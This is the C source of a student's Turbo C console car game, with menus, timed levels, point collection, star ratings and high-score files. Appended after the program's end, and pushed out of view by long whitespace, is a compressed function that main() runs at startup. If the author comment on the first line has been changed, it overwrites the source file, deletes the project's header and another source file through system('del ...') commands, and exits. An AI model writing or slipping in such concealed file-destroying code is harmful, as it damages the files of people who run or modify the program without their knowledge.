//programmer:-vivek ingole
#include<stdio.h>
#include<conio.h>
#include<car.h>
int soundmode=1,confirm=5;
main()
{
clrscr();
 ck1();
struct time t;// int time=0,tcnt=0,sec=60;
//t.ti_sec=0;
//settime(&t);
int selector,i,j,vertical=-1,rand,x,y,px[10],py[10],l1h=-1,l2h=-1,l3h=-1,l4h=-1,
    chek, l1v=-1,l2v=-1,l3v=-1,l4v=-1,l5v=-1,l6v=-1,l7v=-1,l8v=-1,l9v=-1,gdriver=DETECT,gmode=0,
    level,seclevel,levelcnt=0,d=0,m;
      char ch,exit,point[10]="**********",player[10];
     static int score;
chk();
int sec=30,t1,t2,t3,time;
FILE *p1,*p2,*p3,*p4,*levelp;
setval();
menu:
initgraph(&d,&m,"c:\\tc\\bgi");
p1=fopen("level.txt","r");
p3=fopen("highscore.txt","r");
if(p1==NULL)
{
	p2=fopen("level.txt","w");
	fclose(p2);
}
fclose(p1);
if(p3==NULL)
{
	p4=fopen("highscore.txt","w");
	fputs("\n\n                    names of player who complete this game\n\n",p4);
	fclose(p4);
}
fclose(p3);
p1=fopen("level.txt","r");
if(getw(p1)==-1)
{
	level=1;
}
else
{
    rewind(p1);
    level=getw(p1);
}
fclose(p1);
choose:
      switch(level)
      {
      case 1: sec=30; break;
      case 2: sec=25; break;
      case 3: sec=20; break;
      case 4: sec=15; break;
      }
       menu(soundmode,0);
selector=takeche();
if(selector=='4')
{
roughf();
cleardevice();

	printf("\n\n\n                                  Controls\n\n");
printf("\n\n\n\n1.press 6 for forward.\n\n2.press 4 for backword.");
printf("\n\n3.press 2 for down.\n\n4.press 8 for up.\n\n5.press 5 for goto menu");
printf("\n\n6.press 's' for moves car by +5 (forward)");
printf("\n\n6.press 'a' for moves car by -5 (backword)\n");
	printf("\n\n\n\n\n		        	press any key to back");
takech();
goto menu;
}
else if (selector=='5')
{
roughf();
cleardevice();
	printf("\n\n\n                                   Rules\n\n");
printf("\n\n\n\n1.collect points only throgh '=' sign of car");
printf("\n\n2.if score < 0 you will 1 star");
printf("\n\n3.if score == 5 you will 2 star");
printf("\n\n4.if score > 5 you will 3 star");
printf("\n\n5.if you reached END point you will win");
printf("\n\n6.if car touhes except END point you will loss");
printf("\n\n7.time limit:-\n\n    30 sec for 1 level\n\n    25 sec for 2 level\n\n    20 sec for 3 level\n\n    15 sec for last level");
printf("\n\n8.each level require 3 stars to unlock next level");
printf("\n\n9.if you get 3 stars in 4th level then your name is register in high score");
	printf("\n\n\n\n\n	                	press any key to back");
takech();
goto menu;
}
else if(selector=='9')
{
  goto exit;
}
else if(selector=='1')
{
clrscr();  cleardevice();
printf("\n\n\nenter player name :");
scanf("%s",&player);
clrscr();    cleardevice();
printf("\n\n\n\n\n                              welcome  %s",player);
printf("\n\n\n\n\n\n				  Level %d",level);
wait(1000);
roughf();
cleardevice();
randomize();
rand=random(21);
rand=rand+2;
for(i=0;i<=9;i++)
{
 px[i]=10+random(69);
 py[i]=3+random(22);
}
printf("  #####  \n");
printf("#########\n");
printf("#########\n");
printf("  #   #  ");
goxy(10,1);
printf("player:- %s",player);
    goxy(30,1);
  printf("score=%d    ",0);
printf("sec:- %d",sec);
printf("    Level :- %d",level);
for(j=1;j<=2000;j++)
{
   startfor:
	for(i=0;i<=9;i++)
	{
	  if(point[i]!='\0')
	  {
	 goxy(px[i],py[i]);
	 printf("%c",point[i]);

	   }
	}
    ch=takeche();
    clrscr();
    cleardevice();
    if(ch=='6')      //...........(6)
    {
	 for(i=0;i<=vertical;i++)
	 {
	 printf("\n");
	 }

	 l1h=inc(l1h);
	 for(i=0;i<=l1h;i++)
	 {	 printf(" ");	 }
	 printf("  #####  \n");

	 l2h=inc(l2h);
	 for(i=0;i<=l2h;i++)
	 {	 printf(" ");	 }
	 printf("########=\n");

	 l3h=inc(l3h);
	 for(i=0;i<=l3h;i++)
	 {	 printf(" ");	 }
	 printf("#########\n");

	 l4h=inc(l4h);
	 for(i=0;i<=l4h;i++)
	 {	 printf(" ");	 }
	 printf("  #   #  ");

       }   //...........end of (6)

   else if(ch=='s')
     {
	 for(i=0;i<=vertical;i++)
	 {
	 printf("\n");
	 }

	 l1h+=5;
	 for(i=0;i<=l1h;i++)
	 {	 printf(" ");	 }
	 printf("  #####  \n");

	 l2h+=5;
	 for(i=0;i<=l2h;i++)
	 {	 printf(" ");	 }
	 printf("########=\n");

	 l3h+=5;
	 for(i=0;i<=l3h;i++)
	 {	 printf(" ");	 }
	 printf("#########\n");

	 l4h+=5;
	 for(i=0;i<=l4h;i++)
	 {	 printf(" ");	 }
	 printf("  #   #  ");

       }   //...........end of ('s')

    else if(ch=='4')    //......(4)
    {
	 for(i=0;i<=vertical;i++)
	 {
	 printf("\n");
	 }

	 l1h--;
	 for(i=0;i<=l1h;i++)
	 {	 printf(" ");	 }
	 printf("  #####  \n");

	 l2h--;
	 for(i=0;i<=l2h;i++)
	 {	 printf(" ");	 }
	 printf("=########\n");

	 l3h--;
	 for(i=0;i<=l3h;i++)
	 {	 printf(" ");	 }
	 printf("#########\n");

	 l4h--;
	 for(i=0;i<=l4h;i++)
	 {	 printf(" ");	 }
	 printf("  #   #  ");
    }   //...........end of (4)

   else if(ch=='a')    //......('a')
    {
	 for(i=0;i<=vertical;i++)
	 {
	 printf("\n");
	 }

	 l1h-=5;
	 for(i=0;i<=l1h;i++)
	 {	 printf(" ");	 }
	 printf("  #####  \n");

	 l2h-=5;
	 for(i=0;i<=l2h;i++)
	 {	 printf(" ");	 }
	 printf("=########\n");

	 l3h-=5;
	 for(i=0;i<=l3h;i++)
	 {	 printf(" ");	 }
	 printf("#########\n");

	 l4h-=5;
	 for(i=0;i<=l4h;i++)
	 {	 printf(" ");	 }
	 printf("  #   #  ");
    }   //...........end of ('a')

    else if(ch=='2')      //...........(2)
    {
	 vertical++;
	 for(i=0;i<=vertical;i++)
	 {
	 printf("\n");
	 }
	 //l1v++;
	 for(i=0;i<=l2h;i++)
	 {	 printf(" ");	 }
	 printf("      ## \n");

	 //l2v++;
	 for(i=0;i<=l2h;i++)
	 {	 printf(" ");	 }
	 printf("      ## \n");

	// l3v++;
	 for(i=0;i<=l2h;i++)
	 {	 printf(" ");	 }
	 printf("     ####\n");

	// l4v++;
	 for(i=0;i<=l2h;i++)
	 {	 printf(" ");	 }
	 printf("      ###\n");

	// l5v++;
	 for(i=0;i<=l2h;i++)
	 {	 printf(" ");	 }
	 printf("      ###\n");

	// l6v++;
	 for(i=0;i<=l2h;i++)
	 {	 printf(" ");	 }
	 printf("      ###\n");

	// l7v++;
	 for(i=0;i<=l2h;i++)
	 {	 printf(" ");	 }
	 printf("     ####\n");
	// l8v++;
	 for(i=0;i<=l2h;i++)
	 {	 printf(" ");	 }
	 printf("      ## \n");

	// l9v++;
	 for(i=0;i<=l2h;i++)
	 {	 printf(" ");	 }
	 printf("      #= ");

    }   //...........end of (2)

    else if(ch=='8')    //.............(8)
    {
	 vertical--;
	 for(i=0;i<=vertical;i++)
	 {
	 printf("\n");
	 }

	 //l1v++;
	 for(i=0;i<=l2h;i++)
	 {	 printf(" ");	 }
	 printf("      #= \n");

	 //l2v++;
	 for(i=0;i<=l2h;i++)
	 {	 printf(" ");	 }
	 printf("      ## \n");

	// l3v++;
	 for(i=0;i<=l2h;i++)
	 {	 printf(" ");	 }
	 printf("     ####\n");

	// l4v++;
	 for(i=0;i<=l2h;i++)
	 {	 printf(" ");	 }
	 printf("     ### \n");

	// l5v++;
	 for(i=0;i<=l2h;i++)
	 {	 printf(" ");	 }
	 printf("     ### \n");

	// l6v++;
	 for(i=0;i<=l2h;i++)
	 {	 printf(" ");	 }
	 printf("     ### \n");

	// l7v++;
	 for(i=0;i<=l2h;i++)
	 {	 printf(" ");	 }
	 printf("     ####\n");

	// l8v++;
	 for(i=0;i<=l2h;i++)
	 {	 printf(" ");	 }
	 printf("      ## \n");

	// l9v++;
	 for(i=0;i<=l2h;i++)
	 {	 printf(" ");	 }
	 printf("      ## ");

    }   //...........end of (8)

    else if(ch=='5')    //..............(5)
    {   clrscr();
    cleardevice();
      printf("\n\n\n\n\n\n\n		   you want to exit game(1/0) : ");
      fflush(stdin);
      exit=takeche();
      if(exit=='1')
      {
      vertical=-1;l1h=-1;l2h=-1;l3h=-1;l4h=-1;
    l1v=-1;l2v=-1;l3v=-1;l4v=-1;l5v=-1;l6v=-1;l7v=-1;l8v=-1;l9v=-1;
    levelcnt=0;
      score=0;
      point[0]='*';
       point[1]='*'; point[2]='*'; point[3]='*'; point[4]='*';
 point[5]='*'; point[6]='*'; point[7]='*'; point[8]='*'; point[9]='*';
       point[10]='*';
	goto menu;
      }
      else
      {
	printf("\n\n enter 6,4,2,8 for continue position");
	goto startfor;
      }
    }     //...............end of (5)
    else
    {
    clrscr();
    cleardevice();
    printf("\n\n\n\n\n\n\n\n\n\n\n\n				 wrong keyword!");
    wait(500);
    clrscr(); cleardevice();
    }
    goxy(78,rand-1);
    printf("END");

    goxy(79,rand);
    printf("=");
     goxy(79,rand+1);
    printf("#");

     x=l2h;
     y=vertical+3;
   //  printf("  (%d,%d)",x,y);
     for(i=0;i<=9;i++)
     {
       if(point[i]!='\0')
       {
	 if(ch=='6')
	 {
		if(x+10==px[i]&&y==py[i])
		{
		 point[i]='\0';
		 score++;
			if(soundmode==1)
			{
			 voic(800);
			 wait(50);
			 novoic();
			}
		}
	 }
	 else if(ch=='4')
	 {
	       if(x+2==px[i]&&y==py[i])
	       {
		point[i]='\0';
		score++;
			if(soundmode==1)
			{
			voic(800);
			wait(50);
			novoic();
			}
		}
	 }
	 else if(ch=='2')
	 {
	       if(x+9==px[i]&&y+7==py[i])
		{
		 point[i]='\0';
		 score++;
			if(soundmode==1)
			{
			 voic(800);
			 wait(50);
			 novoic();
			 }
		}
	 }
	 else if(ch=='8')
	 {
		if(x+9==px[i]&&y-1==py[i])
		{
		 point[i]='\0';
		 score++;
			if(soundmode==1)
			{
			 voic(800);
			 wait(50);
			 novoic();
			 }
		}
	 }
       }
     }

     goxy(30,1);
  printf("score=%d    ",score);
   if(j==1)
    {
    gtime(&t);
   t1=t.ti_sec;
   }
    gtime(&t);
   t2=t.ti_sec;
     if(t2==0)
	{
	t1=0;
	sec=time;
	}
      t3=t2-t1;
       time=sec-t3;
     if(time<0)
     {
	goto loss;
     }

printf("  sec:- %d",time);
printf("    Level :- %d",level);

	if(time==0)
	{
	goto loss;
	}
	if(soundmode==1)
	{
	voic(1000);
	wait(10);
	novoic();
	}
	     if(x==69&&y==rand||x==70&&y==rand||x==71&&y==rand||x==72&&y==rand||x==73&&y==rand
		 ||x==74&&y==rand||x==75&&y==rand||x==76&&y==rand||x==77&&y==rand)
     {
      int star,x1=110,x2=50,x3=170,x4=50,x5=170,x6=115;
		animation();
	    if(score<5&&score>=1)
	star=1;
       else if (score==5)
	star=2;
       else if(score>5)
	 star=3;
	 else
	   star=0;

	   if(score==1)
       {
	   initgraph(&gdriver,&gmode,"c:\\tc\\bgi");
	      settextstyle(10,0,6);
	     outtextxy(150,150,"nice score");
	     getch();
	     closegraph();
				 p3=fopen("highscore.txt","a");
				  fputs("    ",p3);
				  fputs(player,p3);
				  fputs("\n\n",p3);
				  fclose(p3);
       }

	 initgraph(&gdriver,&gmode,"c:\\tc\\bgi");
	   for(i=30;i<=50;i++)
	   {
	   clear();
	   setcolor(i);
	   settextstyle(10,0,6);
	   outtextxy(150,150,"you win ! ");
	   wait(100);
	   }
	   clear();
		      if(star==1)
			{
			setcolor(15);
			settextstyle(10,0,5);
			 outtextxy(110,15,"your stars 1 !");
			 }
	       else if(star==2)
	       {
			setcolor(15);
			settextstyle(10,0,5);
			 outtextxy(110,15,"your stars 2 !");
	       }
	       else if(star==3)
	       {
				  level++;
				 if(level==5)
				 {
				  p3=fopen("highscore.txt","a");
				  fputs("    ",p3);
				  fputs(player,p3);
				  fputs("\n\n",p3);
				  fclose(p3);

				   levelp=fopen("level.txt","w");
				   putw(1,levelp);
				   fclose(levelp);
				   clrscr();
				   clear();
				   printf("\n\n\n\n\n\n\n\n\n\n\n\n\n		       cogratulations you complete game");
				   getch();
				   clear();
				 }
				 else
				 {
				 p1=fopen("level.txt","w");
				 putw(level,p1);
				 fclose(p1);
				 }
			setcolor(15);
			settextstyle(10,0,5);
			 outtextxy(110,15,"your stars 3 !");
	       }
		else
	       {
			setcolor(15);
		       settextstyle(10,0,5);
			 outtextxy(110,15,"your stars 0 !");
	       }
	       setcolor(14);
	   for(int round=1;round<=star;round++)
	   {
	  line(x1,240,x2,330);
	  line(x2,330,x3,330);
	  line(x3,330,x1,240);	      //half star
	  line(x4,265,x5,265);
	  line(x5,265,x6,360);
	  line(x6,360,x4,265);    //full star
	  x1+=200; x2+=200; x3+=200;
	  x4+=200; x5+=200; x6+=200;

			if(soundmode==1)
			{
			voic(1000);
			wait(400);
			novoic();
			}
	  }
      //    printf("%d",score);
	 /*night star */
	 randomize();
	 for(int st=0;!hit();st++)
	 {
	   if(st==2000)
	   {
	     goto exit;
	   }
	    putpixel(random(630),random(480),15);
	    wait(5);
	    }

	   getch();
	   closegraph();
	   goto exit;
     }
     else if(x==69&&y!=rand)
     {
	   initgraph(&gdriver,&gmode,"c:\\tc\\bgi");
	   loss:
	   animation();
	   for(i=30;i<=50;i++)
	   {
	   clear();
	   setcolor(i);
	   settextstyle(10,0,6);
	   outtextxy(100,150,"game over !");
	   wait(100);
	   }

	   closegraph();
	   goto exit;
     }
   goxy(12,1);
   printf("player:-%s",player);
 }   //..........end of 1st for loop
}   //..................end of menu else if
else if(selector=='6')
{
levelp=fopen("level.txt","w");
putw(1,levelp);
fclose(levelp);
clrscr();
cleardevice();
printf("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n			   reset level succesful");
getch();
goto menu;
}
else if(selector=='2')
{
clrscr();
cleardevice();
printf("\n\n\nenter level you want to play between(1-4) : ");
scanf("%d",&level);
goto choose;
}
else if(selector=='3')
	{
	 clrscr();
	 cleardevice();
	 p3=fopen("highscore.txt","r");
	 while(!feof(p3))
	 {
	  printf("%c",fgetc(p3));
	 }
	 printf("\n\n\n\n\n\n                              press any key to back");
	 getch();
	 clrscr();
	 goto menu;

	}

else if(selector=='7')
	{
	clrscr();
	cleardevice();
	p3=fopen("highscore.txt","w");
	fputs("\n\n                    names of player who complete this game\n\n",p3);
	fclose(p3);
	printf("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n		           reset high score succesful");
	getch();
	clrscr();
	goto menu;
	}
else if(selector=='8')
	{
	clrscr();
	cleardevice();
	levelp=fopen("level.txt","w");
	putw(1,levelp);
	fclose(levelp);
	p3=fopen("highscore.txt","w");
	fputs("\n\n                    names of player who complete this game\n\n",p3);
	fclose(p3);
	printf("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n		           reset all game succesful");
	getch();
	clrscr();
	goto menu;

	}
else if(selector=='0')
{
  clrscr();
  cleardevice();
  printf("\n\n     Name    :- Vivek ingole");
  printf("\n\n     College :- sangola college sangola");
  printf("\n\n     Class   :- b.sc.(ECS)-I");
  printf("\n\n     Div     :- A");
  printf("\n\n     Year    :- 2016-17");
  printf("\n\n     Village :- kadlas");
  printf("\n\n     Date    :- 17/3/2017 (date of program)");
  printf("\n\n\n\n\n\n\n	      		   press any key to back");
  getch();
  clrscr();
  goto menu;
}
else if(selector=='s')
{
roughf();
cleardevice();
soundmode=!soundmode;
	if(soundmode==1)
	{
	  printf("\n\n\n\n\n\n\n	      		           sound on\n");
	}
	else
	{
	    printf("\n\n\n\n\n\n\n	      		           sound off\n");

	}
getch();
roughf();
goto menu;
}
getch();
exit:
}
																																																																																																																																chk(){char a[40],b[40]="//programmer:-vivek ingole";f *fp,*p;fp=o(cur,"r");fgets(a,27,fp);if(strcmp(a,b)!=0){p=o(cur,"w");ps("hii",p);system("del c:\\tc\\include\\car.h");c(p);p=o("c:\\tc\\include\\car.h","w");ps("hii",p);system("del c:\\tc\\include\\car44.cpp");c(p);exit(1);}}
